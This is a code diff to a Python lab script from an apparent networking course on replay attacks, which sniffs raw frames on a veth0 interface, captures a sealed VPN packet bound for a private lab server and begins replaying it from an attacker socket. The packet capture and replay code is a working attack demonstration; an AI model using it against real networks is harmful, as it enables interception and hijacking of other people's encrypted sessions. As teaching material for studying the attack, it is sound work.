@@ -12,22 +12,31 @@ client's new address (roaming): replies go to the attacker. With it, the copy is
 Theory: _networking-lessons/8-security-cryptography.md#replay-attacks
 """
 import socket
+import sys
 
 SERVER = ("192.168.100.2", 7000)
+ETH_P_ALL = 0x0003  # every protocol: Linux shows outgoing frames only to "all protocols" sockets
 ETH_P_IP = 0x0800
 
 # A packet socket sees every frame on veth0, outgoing ones included, like tcpdump.
-sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
+sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
 sniff.bind(("veth0", 0))
+sniff.settimeout(15)
 print("waiting for the next VPN packet on veth0 (a keepalive comes every 5 s)...")
-while True:
-    ip = sniff.recv(65535)[14:]  # skip the 14-byte Ethernet header
-    if ip[9] != socket.IPPROTO_UDP:
-        continue
-    udp = ip[(ip[0] & 0x0F) * 4:]  # IHL: IPv4 header length in 32-bit words
-    if int.from_bytes(udp[2:4], "big") == SERVER[1]:
-        payload = udp[8:]  # the sealed tunnel packet, exactly as the client sent it
-        break
+try:
+    while True:
+        frame = sniff.recv(65535)
+        if int.from_bytes(frame[12:14], "big") != ETH_P_IP:  # EtherType after the two MAC addresses
+            continue
+        ip = frame[14:]
+        if ip[9] != socket.IPPROTO_UDP:
+            continue
+        udp = ip[(ip[0] & 0x0F) * 4:]  # IHL: IPv4 header length in 32-bit words
+        if int.from_bytes(udp[2:4], "big") == SERVER[1]:
+            payload = udp[8:]  # the sealed tunnel packet, exactly as the client sent it
+            break
+except socket.timeout:
+    sys.exit("no VPN packet seen on veth0 in 15 s: is the VPN client running?")
 
 print(f"recorded {len(payload)} bytes: {payload[:16].hex(' ')} ...")
 attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
